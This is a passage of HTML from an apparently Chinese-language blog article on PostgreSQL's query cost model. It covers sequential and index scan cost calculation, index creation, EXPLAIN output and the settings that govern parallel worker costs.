class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnumber_of_records = 1000000\r\n\r\nblock_size    = 8192     # block size in bytes\r\nrelation_size = 44285952\r\n\r\nblocks = relation_size / block_size # =&gt; 5406\r\n\r\nseq_page_cost   = 1\r\ncpu_tuple_cost  = 0.01\r\ncpu_filter_cost = 0.0025;\r\n\r\ncost = blocks * seq_page_cost +\r\n   number_of_records * cpu_tuple_cost +\r\n   number_of_records * cpu_filter_cost\r\n\r\ncost # =&gt; 17546\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa8313394220-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa8313394220-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-1\"><span class=\"crayon-v\">number_of_records</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-3\"><span class=\"crayon-v\">block_size</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8192</span><span class=\"crayon-h\">     </span><span class=\"crayon-p\"># block size in bytes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-4\"><span class=\"crayon-v\">relation_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">44285952</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-6\"><span class=\"crayon-v\">blocks</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">relation_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">block_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># =&gt; 5406</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-8\"><span class=\"crayon-v\">seq_page_cost</span><span class=\"crayon-h\">   </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-9\"><span class=\"crayon-v\">cpu_tuple_cost</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.01</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-10\"><span class=\"crayon-v\">cpu_filter_cost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0025</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-12\"><span class=\"crayon-v\">cost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">blocks *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">seq_page_cost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-13\"><span class=\"crayon-h\">   </span><span class=\"crayon-e \">number_of_records *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cpu_tuple_cost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-14\"><span class=\"crayon-h\">   </span><span class=\"crayon-e \">number_of_records *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cpu_filter_cost</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa8313394220-16\"><span class=\"crayon-v\">cost</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># =&gt; 17546</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa8313394220-17\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p></p>\n<h1 id=\"索引和postgresql成本模型\">索引和PostgreSQL成本模型</h1>\n<p>索引在数据库工程师的生活中很可能仍然是最重要的话题。添加索引是否可以降低SELECT语句的成本呢？通过下面的例子来找出答案。</p>\n<p>首先，在users表中添加一个索引：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486fac492653351\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # CREATE INDEX idx_users_id ON users (id);\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fac492653351-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fac492653351-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486fac492653351-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># CREATE INDEX idx_users_id ON users (id);</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fac492653351-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>观察一下新索引的查询规划。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486faf992906014\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # EXPLAIN SELECT * FROM users WHERE id = 870123;\r\n\r\n           QUERY PLAN\r\n----------  ----------  ----------\r\n     Index Scan using idx_users_id on users  (cost=0.42..8.44 rows=1 width=9)\r\n   Index Cond: (id = 870123)\r\n(2 rows)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486faf992906014-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486faf992906014-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486faf992906014-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486faf992906014-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486faf992906014-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486faf992906014-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486faf992906014-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486faf992906014-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486faf992906014-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># EXPLAIN SELECT * FROM users WHERE id = 870123;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486faf992906014-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486faf992906014-3\"><span class=\"crayon-h\">           </span><span class=\"crayon-e\">QUERY </span><span class=\"crayon-v\">PLAN</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486faf992906014-4\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486faf992906014-5\"><span class=\"crayon-h\">     </span><span class=\"crayon-e\">Index </span><span class=\"crayon-e\">Scan </span><span class=\"crayon-e\">using </span><span class=\"crayon-e\">idx_users_id </span><span class=\"crayon-e\">on </span><span class=\"crayon-e\">users</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.42..8.44</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486faf992906014-6\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">Index </span><span class=\"crayon-v\">Cond</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">870123</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486faf992906014-7\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486faf992906014-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>成本函数显著下降。索引扫描的计算比顺序扫描的计算要复杂一些。它由两个阶段组成。</p>\n<p>PostgreSQL会考虑<code>random_page_cost</code>和<code>cpu_index_tuple_cost</code> 变量，并返回一个基于索引树的高度的值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486fb2656583889\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # SHOW random_page_cost;\r\n\r\n random_page_cost\r\n ----------------\r\n  4\r\n\r\ndb # SHOW cpu_index_tuple_cost;\r\n cpu_index_tuple_cost\r\n----------\r\n  0.005\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb2656583889-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb2656583889-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb2656583889-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb2656583889-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb2656583889-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb2656583889-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb2656583889-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb2656583889-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb2656583889-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb2656583889-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb2656583889-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486fb2656583889-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SHOW random_page_cost;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb2656583889-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb2656583889-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random_page_cost</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb2656583889-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb2656583889-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb2656583889-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb2656583889-7\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SHOW cpu_index_tuple_cost;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb2656583889-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cpu_index_tuple_cost</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb2656583889-9\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb2656583889-10\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.005</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb2656583889-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>对于实际的计算，请考虑阅读<a href=\"https://github.com/postgres/postgres/blob/ab72716778128fb63d54ac256adf7fe6820a1185/src/backend/optimizer/path/costsize.c#L466\" target=\"_blank\">成本指数</a>计算器的源代码。</p>\n<h1 id=\"工作进程的成本\">工作进程的成本</h1>\n<p>PostgreSQL可以启动并行的工作进程（worker）来执行查询。但是，开启一个新的工作进程，性能会受到影响。</p>\n<p>为了计算使用并行工作进程的成本，PostgreSQL使用 <code>parallel_tuple_cost</code>这个命令，它定义了从一个工作进程传送元组到另一个工作进程的成本，<code>parallel_setup_cost</code>命令意味着启动一个新的工作进程（worker）的成本，以下是查询示例。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486fb6295120865\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # SHOW parallel_tuple_cost;\r\n\r\n parallel_tuple_cost\r\n---------------------\r\n  0.1\r\n\r\ndb # SHOW parallel_setup_cost;\r\n\r\n parallel_setup_cost\r\n---------------------\r\n 1000\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb6295120865-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb6295120865-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb6295120865-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb6295120865-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb6295120865-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb6295120865-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb6295120865-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb6295120865-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb6295120865-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb6295120865-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fb6295120865-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fb6295120865-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486fb6295120865-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SHOW parallel_tuple_cost;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb6295120865-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb6295120865-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">parallel_tuple_cost</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb6295120865-4\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb6295120865-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb6295120865-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb6295120865-7\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SHOW parallel_setup_cost;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb6295120865-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb6295120865-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">parallel_setup_cost</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb6295120865-10\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fb6295120865-11\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fb6295120865-12\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113358\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113358votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113358\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style 